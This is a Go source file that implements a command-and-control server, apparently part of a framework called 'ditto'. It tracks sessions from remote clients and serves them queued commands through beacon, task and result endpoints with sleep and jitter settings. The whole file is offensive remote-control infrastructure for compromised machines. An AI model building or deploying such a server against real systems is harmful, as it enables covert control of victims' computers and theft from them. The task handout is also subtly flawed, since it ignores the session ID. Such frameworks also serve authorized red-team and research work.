package transport

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"time"

	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/tasks"
)

// Server handles C2 server operations
type Server struct {
	config     *core.Config
	logger     interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
	sessions   map[string]*Session
	sessionsMu sync.RWMutex
	handler    *http.ServeMux
	server     *http.Server
	taskQueue  *tasks.Queue
}

// Session represents a client session
type Session struct {
	ID          string
	RemoteAddr  string
	ConnectedAt time.Time
	LastSeen    time.Time
	Metadata    map[string]interface{}
}

// NewServer creates a new C2 server
func NewServer(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *Server {
	s := &Server{
		config:    config,
		logger:    logger,
		sessions:  make(map[string]*Session),
		handler:   http.NewServeMux(),
		taskQueue: tasks.NewQueue(1000),
	}
	
	s.setupRoutes()
	return s
}

func (s *Server) setupRoutes() {
	// Beacon endpoint
	s.handler.HandleFunc("/beacon", s.handleBeacon)
	
	// Task endpoint
	s.handler.HandleFunc("/task", s.handleTask)
	
	// Result endpoint
	s.handler.HandleFunc("/result", s.handleResult)
	
	// Health check
	s.handler.HandleFunc("/health", s.handleHealth)
}

// Start starts the C2 server
func (s *Server) Start(listenAddr string) error {
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
	}
	
	s.server = &http.Server{
		Addr:         listenAddr,
		Handler:      s.handler,
		TLSConfig:    tlsConfig,
		ReadTimeout:  s.config.Server.ReadTimeout,
		WriteTimeout: s.config.Server.WriteTimeout,
		IdleTimeout:  s.config.Server.KeepAlive,
	}
	
	s.logger.Info("Starting C2 server on %s", listenAddr)
	
	if s.config.Server.TLSEnabled {
		return s.server.ListenAndServeTLS(
			s.config.Server.TLSCertPath,
			s.config.Server.TLSKeyPath,
		)
	}
	
	return s.server.ListenAndServe()
}

func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		sessionID = generateSessionID()
	}
	
	s.sessionsMu.Lock()
	session, exists := s.sessions[sessionID]
	if !exists {
		session = &Session{
			ID:          sessionID,
			RemoteAddr:  r.RemoteAddr,
			ConnectedAt: time.Now(),
			LastSeen:    time.Now(),
			Metadata:    make(map[string]interface{}),
		}
		s.sessions[sessionID] = session
		s.logger.Info("New session: %s from %s", sessionID, r.RemoteAddr)
	} else {
		session.LastSeen = time.Now()
	}
	s.sessionsMu.Unlock()
	
	// Read client metadata
	var metadata map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&metadata); err == nil {
		session.Metadata = metadata
	}
	
	// Return any pending tasks
	tasks := s.getPendingTasks(sessionID)
	
	response := map[string]interface{}{
		"session_id": sessionID,
		"tasks":      tasks,
		"sleep":      s.config.Communication.Sleep.Seconds(),
		"jitter":     s.config.Communication.Jitter,
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	tasks := s.getPendingTasks(sessionID)
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"tasks": tasks,
	})
}

func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	var result map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	
	s.logger.Info("Task result from session %s: %v", sessionID, result)
	
	w.WriteHeader(http.StatusOK)
}

func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
	pending := s.taskQueue.GetPending()
	tasks := make([]map[string]interface{}, 0, len(pending))
	
	for _, task := range pending {
		tasks = append(tasks, map[string]interface{}{
			"id":         task.ID,
			"type":       task.Type,
			"command":    task.Command,
			"parameters": task.Parameters,
		})
	}
	
	return tasks
}

func generateSessionID() string {
	return fmt.Sprintf("sess-%d", time.Now().UnixNano())
}

